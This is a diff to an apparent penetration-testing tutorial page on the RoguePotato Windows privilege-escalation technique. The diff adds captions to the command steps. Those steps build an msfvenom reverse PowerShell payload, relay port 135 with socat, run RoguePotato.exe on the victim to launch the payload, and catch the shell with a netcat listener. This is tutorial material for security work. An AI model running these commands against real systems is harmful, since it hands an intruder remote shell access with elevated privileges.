@@ -73,10 +73,13 @@
                         <li>You need to have a machine under your control where you can perform the redirect and this machine must be accessible on port 135 by the victim</li>
                         <li>Upload both exe files from the PoC</li>
                     </ul>
-                    
+                    <p> Creation of a shell that will be used later </p>
                     <pre><code class="language-powershell">msfvenom -p cmd/Windows/reverse_powershell lhost=LOCAL_IP lport=9999 > shell.bat</code></pre>
+                    <p> Execute that command in attacker machine to capture connection</p>
                     <pre><code class="language-powershell">socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999</code></pre>
+                    <p> Execute that command in victim machine</p>
                     <pre><code class="language-powershell">.\RoguePotato.exe -r VICTIM_IP -e ".\shell.bat" -l 9999</code></pre>
+                    <p> Execute that command in attacker machine</p>
                     <pre><code class="language-powershell">nc -lvnp 9999</code></pre>
                 </div>
         </div>
